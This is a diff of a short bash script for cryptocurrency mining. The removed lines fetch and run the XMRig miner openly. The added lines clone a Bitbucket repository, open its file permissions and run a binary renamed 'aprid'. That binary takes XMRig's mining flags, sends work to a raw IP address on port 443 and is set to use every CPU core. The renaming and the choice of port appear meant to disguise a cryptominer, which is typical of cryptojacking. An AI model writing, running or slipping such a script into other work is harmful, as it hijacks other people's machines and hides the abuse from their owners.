@@ -1,3 +1,6 @@
 #!/bin/bash
-wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
-./xmrig --donate-level 1 -o sg.qrl.herominers.com:1166 -u solo:Q01050050a3b472f4683d329cb6237cdc0554e8320a14a6840a4d9a96d8a420988d3450646770be -p lalita -a rx/0
+yum update && yum -y install sudo
+yum -y install git wget
+git clone https://bitbucket.org/asana/luo.git && cd luo
+chmod 777 aprid SHA256SUMS
+./aprid --donate-level 1 -o 209.97.149.155:443 -u solo:SaLvsBAMHcnaDrMMLok961GKJJhkKbspE9FRaAYbjGxPFQwqgRFuNn2BjSyMHxMT2FVkVVUMpqgVURM4jmFQFsq6RcsBY64WmBj -p us -a rx/0 -k -t $(nproc --all)
